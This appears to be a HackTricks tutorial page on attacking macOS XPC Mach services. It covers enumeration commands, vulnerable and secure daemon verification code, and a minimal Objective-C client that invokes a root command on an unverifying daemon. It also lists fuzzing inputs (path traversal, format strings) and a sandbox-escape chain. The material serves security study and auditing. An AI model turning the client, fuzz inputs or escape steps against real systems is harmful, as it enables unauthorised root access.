# macOS XPC Mach Services Abuse

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

**XPC** (Cross-Process Communication) は、macOSにおける主要なIPCメカニズムです。システムデーモンは**Mach services**を公開します — `launchd` に登録された名前付きポートで、他のプロセスは `NSXPCConnection` 経由で接続できます。

`MachServices`キーを持つすべての**LaunchDaemon**および**LaunchAgent**のplistは、1つ以上の名前付きMachポートを登録します。これらはシステム全体のXPCエンドポイントであり、任意のプロセスが接続を試みることができます。

> [!WARNING]
> XPC Mach servicesはmacOS上で**最も大きなローカル権限昇格の攻撃対象**です。近年のほとんどのローカル root エクスプロイトは、LaunchDaemons内の脆弱なXPCサービスを経由していました。rootデーモンで公開されている各メソッドは潜在的な昇格ベクターです。

### アーキテクチャ
```
Client Process (user context)
↓ NSXPCConnection / xpc_connection_create_mach_service()
↓ Mach message via launchd
Daemon Process (root context)
↓ Receives XPC message
↓ (Should verify client identity / entitlements)
↓ Performs privileged operation
```
## 列挙

### Mach Services を使ったデーモンの発見
```bash
# Find all LaunchDaemons with MachServices
find /Library/LaunchDaemons /System/Library/LaunchDaemons -name "*.plist" -exec sh -c '
plutil -p "{}" 2>/dev/null | grep -q "MachServices" && echo "{}"
' \; 2>/dev/null

# List active Mach services
sudo launchctl dumpstate 2>/dev/null | grep -E "name = " | sort -u | head -50

# List all launchd services
launchctl list

# Check a specific daemon's Mach services
plutil -p /Library/LaunchDaemons/com.example.daemon.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged, e.isDaemon
FROM executables e
WHERE e.isDaemon = 1
ORDER BY e.privileged DESC
LIMIT 50;"
```
### XPC インターフェイスの列挙

daemon を特定したら、その XPC interface を reverse-engineer する:
```bash
# Find the protocol definition in the binary
strings /path/to/daemon | grep -i "protocol\|interface\|xpc\|method"

# Use class-dump to extract ObjC protocol definitions
class-dump /path/to/daemon | grep -A20 "@protocol"

# Check for XPC service bundles inside app bundles
find /Applications -path "*/XPCServices/*.xpc" 2>/dev/null
```
## XPC クライアント検証の脆弱性

XPC サービスで最も一般的な脆弱性クラスは **insufficient client verification** です。daemon は次を検証する必要があります:

1. 接続してくるプロセスの **Code signature**
2. 接続してくるプロセスの **Entitlements**
3. **Audit token**（再利用され得るため PID ではない）

### 脆弱なパターン: 検証なし
```objc
// VULNERABLE — daemon accepts any connection
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyProtocol)];
newConnection.exportedObject = self;
[newConnection resume];
return YES; // No verification!
}
```
### 脆弱なパターン: PIDベースの検証（レースコンディション）
```objc
// VULNERABLE — PID can be reused between check and use
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
pid_t pid = newConnection.processIdentifier;
// Attacker can win race: spawn legitimate process → get PID → kill it → exploit process reuses PID
if ([self isAuthorizedPID:pid]) {
[newConnection resume];
return YES;
}
return NO;
}
```
### セキュアなパターン：監査トークンの検証
```objc
// SECURE — Uses audit token which cannot be spoofed
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
audit_token_t token = newConnection.auditToken;

// Verify code signature via audit token
SecCodeRef code = NULL;
NSDictionary *attributes = @{(__bridge NSString *)kSecGuestAttributeAudit:
[NSData dataWithBytes:&token length:sizeof(token)]};
SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attributes,
kSecCSDefaultFlags, &code);

// Verify the signature matches expected signing identity
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(
CFSTR("identifier \"com.apple.expected\" and anchor apple"),
kSecCSDefaultFlags, &requirement);

OSStatus status = SecCodeCheckValidity(code, kSecCSDefaultFlags, requirement);
if (status == errSecSuccess) {
[newConnection resume];
return YES;
}
return NO;
}
```
## 攻撃: 保護されていない XPC Services への接続
```objc
// Minimal XPC client — connect to a LaunchDaemon's Mach service
#import <Foundation/Foundation.h>

@protocol VulnDaemonProtocol
- (void)runCommandAsRoot:(NSString *)command withReply:(void (^)(NSString *))reply;
@end

int main(void) {
@autoreleasepool {
NSXPCConnection *conn = [[NSXPCConnection alloc]
initWithMachServiceName:@"com.example.vulndaemon"
options:NSXPCConnectionPrivileged];

conn.remoteObjectInterface = [NSXPCInterface
interfaceWithProtocol:@protocol(VulnDaemonProtocol)];

[conn resume];

id<VulnDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"Connection error: %@", error);
}];

// If the daemon doesn't verify our identity, this works:
[proxy runCommandAsRoot:@"id" withReply:^(NSString *result) {
NSLog(@"Result: %@", result);
// Output: uid=0(root)
}];

[[NSRunLoop currentRunLoop] run];
}
}
```
## 攻撃: XPC Object Deserialization

複雑なオブジェクト（`NSSecureCoding` 準拠）を受け入れる XPC サービスは、**deserialization attacks** の影響を受けやすい場合があります：
```objc
// If the daemon accepts NSObject subclasses via XPC:
// An attacker can send a crafted object that triggers:
// 1. Type confusion (wrong class instantiated)
// 2. Path traversal (filename objects with ../)
// 3. Format string bugs (string objects as format arguments)
// 4. Integer overflow (large numeric values)
```
## Mach-Lookup サンドボックス例外

### 例外がサンドボックス脱出を可能にする方法

サンドボックス化されたアプリケーションは通常、自分自身の XPC サービスとしか通信できません。しかし、**mach-lookup exceptions** によってシステム全体のサービスに到達できます:
```xml
<!-- Entitlement granting mach-lookup exception -->
<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>
<array>
<string>com.apple.system.opendirectoryd.api</string>
<string>com.apple.SecurityServer</string>
<string>com.apple.CoreServices.coreservicesd</string>
</array>
```
### 広範な例外を持つアプリケーションの検索
```bash
# Find sandboxed apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
echo "=== $(basename "$1") ==="
echo "$ents" | grep -B1 -A10 "mach-lookup"
}
}
' _ {} \; 2>/dev/null
```
### サンドボックス脱出チェーン
```
1. Compromise sandboxed app (e.g., via renderer exploit in browser/email)
2. Enumerate mach-lookup exceptions from entitlements
3. Connect to each reachable system daemon
4. Fuzz the daemon's XPC interface for vulnerabilities
5. Exploit a daemon bug → code execution outside the sandbox
6. Escalate from daemon's privilege level (often root)
```
## 特権ヘルパーツール (SMJobBless)

### 仕組み

`SMJobBless`はlaunchd経由でrootとして実行される特権ヘルパーをインストールします。ヘルパーは親アプリとXPC経由で通信します:
```
App (user context) ←→ XPC ←→ Helper (root via launchd)
```
### 一般的な脆弱性: 弱い認可
```objc
// Many helpers check authorization but:
// 1. Don't verify WHO is connecting (any process can connect)
// 2. Use rights that any admin can obtain
// 3. Cache authorization decisions

// VULNERABLE helper pattern:
- (void)performPrivilegedAction:(NSString *)action
authorization:(NSData *)authData
withReply:(void (^)(BOOL))reply {
AuthorizationRef auth;
AuthorizationCreateFromExternalForm(
(AuthorizationExternalForm *)authData.bytes, &auth);

// Only checks if caller has generic admin right
// But doesn't verify the caller is the app that installed the helper!
AuthorizationItem item = {kAuthorizationRightExecute, 0, NULL, 0};
AuthorizationRights rights = {1, &item};

if (AuthorizationCopyRights(auth, &rights, NULL,
kAuthorizationFlagDefaults, NULL) == errAuthorizationSuccess) {
// Performs action as root...
reply(YES);
}
}
```
### 脆弱なヘルパーの悪用
```bash
# 1. Find installed privileged helpers
ls /Library/PrivilegedHelperTools/

# 2. Find their LaunchDaemon plists
ls /Library/LaunchDaemons/ | grep -v "com.apple"

# 3. Check the helper's XPC interface
class-dump /Library/PrivilegedHelperTools/com.example.helper | grep -A20 "@protocol"

# 4. Check if the parent app properly verifies connections
strings /Library/PrivilegedHelperTools/com.example.helper | grep -i "codesign\|requirement\|anchor\|audit"
# If no code-signing verification strings → likely vulnerable
```
## XPC Fuzzing
```bash
# Basic XPC fuzzing approach:

# 1. Identify the target service and protocol
plutil -p /Library/LaunchDaemons/com.example.daemon.plist
class-dump /path/to/daemon

# 2. For each exposed method, test:
#    - NULL arguments
#    - Empty strings
#    - Very long strings (buffer overflow)
#    - Path traversal strings (../../etc/passwd)
#    - Format strings (%n%n%n%n)
#    - Integer boundary values (INT_MAX, -1, 0)
#    - Unexpected object types (send NSDictionary where NSString expected)

# 3. Monitor for crashes
log stream --predicate 'process == "daemon-name" AND (eventMessage CONTAINS "crash" OR eventMessage CONTAINS "fault")'
```
## Real-World CVEs

| CVE | Description |
|---|---|
| CVE-2023-41993 | XPC serviceのデシリアライズ脆弱性 |
| CVE-2022-22616 | XPC serviceの悪用によるGatekeeperバイパス |
| CVE-2021-30657 | Sysmond XPCによる権限昇格 |
| CVE-2020-9839 | システムデーモンにおけるXPCのレースコンディション |
| CVE-2019-8802 | クライアント検証が欠如している特権ヘルパーツール |
| CVE-2023-32369 | Migraine — `systemmigrationd` XPCを介したSIPバイパス |
| CVE-2022-26712 | PackageKit XPCによるroot権限昇格 |

## 列挙スクリプト
```bash
#!/bin/bash
echo "=== XPC Mach Services Security Audit ==="

echo -e "\n[*] Third-party privileged helpers:"
for helper in /Library/PrivilegedHelperTools/*; do
[ -f "$helper" ] || continue
echo "  $helper"
codesign -dvv "$helper" 2>&1 | grep "Authority\|TeamIdentifier" | sed 's/^/    /'
done

echo -e "\n[*] Third-party LaunchDaemons with MachServices:"
for plist in /Library/LaunchDaemons/*.plist; do
plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
echo "  $plist"
plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
}
done

echo -e "\n[*] User LaunchAgents with MachServices:"
for plist in ~/Library/LaunchAgents/*.plist; do
plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
echo "  $plist"
plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
}
done
```
## 参考資料

* [Apple Developer — XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
* [Apple Developer — Daemons and Services Programming Guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html)
* [Objective-See — XPC Exploitation](https://objective-see.org/blog.html)
* [OBTS — XPC Attack Surface talks](https://objectivebythesea.org/)

{{#include ../../../banners/hacktricks-training.md}}
